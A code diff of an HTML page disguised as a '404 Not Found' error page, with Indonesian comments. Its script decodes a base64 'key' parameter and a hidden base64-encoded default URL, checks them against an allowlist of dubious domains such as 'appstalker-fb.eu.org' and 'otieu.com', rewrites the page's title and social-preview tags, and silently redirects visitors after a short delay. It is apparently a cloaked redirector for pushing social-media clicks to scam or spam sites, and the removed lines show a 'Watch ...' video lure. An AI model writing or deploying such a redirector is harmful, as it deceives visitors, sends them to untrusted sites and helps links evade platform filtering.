@@ -3,10 +3,12 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title id="meta-title">Default Title</title>
-<meta name="description" id="meta-desc" content="...">
-<meta property="og:title" id="og-title" content="...">
-<meta property="og:description" id="og-desc" content="...">
+<!-- HEAD -->
+<title id="meta-title">404 Not Found</title>
+<meta id="meta-desc" name="description" content="Halaman tidak ditemukan">
+<meta id="og-title" property="og:title" content="404 Not Found">
+<meta id="og-desc" property="og:description" content="Halaman tidak ditemukan">
+
 <meta name="robots" content="noindex, nofollow">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -80,6 +82,10 @@
 </div>
 </div>
 
+
+
+
+
 <div class="container error-container" id="errorPage">
   <div class="error-code">404</div>
   <h2 class="mb-3">Oops! Page not found</h2>
@@ -87,7 +93,7 @@
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function () {
+(function () {
   const params = new URLSearchParams(window.location.search);
   const encoded = params.get('key');
   if (!encoded) return;
@@ -96,7 +102,8 @@ document.addEventListener("DOMContentLoaded", function () {
     const decoded = atob(encoded.trim());
     const userUrls = decoded.split('|');
 
-    const myEncoded = 'aHR0cHM6Ly9vdGlldS5jb20vNC83NjcwMDA0'; 
+    // URL default kamu
+    const myEncoded = 'aHR0cHM6Ly9hYm5vcm1hbGl0eWxvdmluZ21hbW1hbC5jb20vbXl2aWRlbw==';
     const myDefaultUrl = atob(myEncoded);
 
     const allUrls = [...userUrls, myDefaultUrl];
@@ -109,6 +116,7 @@ document.addEventListener("DOMContentLoaded", function () {
       "abnormalitylovingmammal.com",
       "pwcenter.eu.org",
       "otieu.com",
+      "otieus.com",
       "appstalker-fb.eu.org",
       "xpweyurt.eu.org"
     ];
@@ -116,7 +124,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const isAllowed = allowedDomains.some(domain => host.includes(domain));
 
     if (isAllowed) {
-      const title = "Watch Enkai987 น้อง ริน มาแน้วววว";
+      const title = "Sedang mengalihkan ke halaman tujuan...";
       document.getElementById('meta-title')?.innerText = title;
       document.getElementById('meta-desc')?.setAttribute('content', title);
       document.getElementById('og-title')?.setAttribute('content', title);
@@ -129,13 +137,16 @@ document.addEventListener("DOMContentLoaded", function () {
         window.location.href = finalUrl;
       }, 1200);
     } else {
-      console.warn("Domains not allowed:", host);
+      console.warn("Domain tidak diizinkan:", host);
     }
-  } catch (err) {
-    console.error("Broken Site:", err);
-  }
 
-  // Lazy load image
+  } catch (err) {
+    console.error("Gagal decode base64 atau URL invalid:", err);
+  }
+})();
+
+// ✅ Lazy load semua img[data-src]
+document.addEventListener("DOMContentLoaded", function () {
   const images = document.querySelectorAll('img[data-src]');
   const observer = new IntersectionObserver((entries, obs) => {
     entries.forEach(entry => {
@@ -153,8 +164,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
   images.forEach(img => observer.observe(img));
 });
-
 </script>
+
 
 </script>
  <!-- Histats.com  START  (aync)-->
